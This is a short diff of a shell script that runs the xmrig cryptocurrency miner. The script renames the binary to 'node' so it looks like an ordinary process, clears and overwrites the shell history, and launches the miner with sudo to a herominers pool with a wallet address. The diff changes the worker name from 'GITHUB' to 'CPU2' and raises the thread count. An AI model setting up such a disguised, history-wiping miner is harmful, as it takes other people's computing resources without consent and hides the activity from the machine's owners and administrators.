@@ -5,4 +5,4 @@ rm xmrig-6.24.0-focal-x64.tar.gz
 cd xmrig-6.24.0
 mv ./xmrig ./node
 history -c && history -w && clear
-sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.GITHUB -p x -k -t 2
+sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
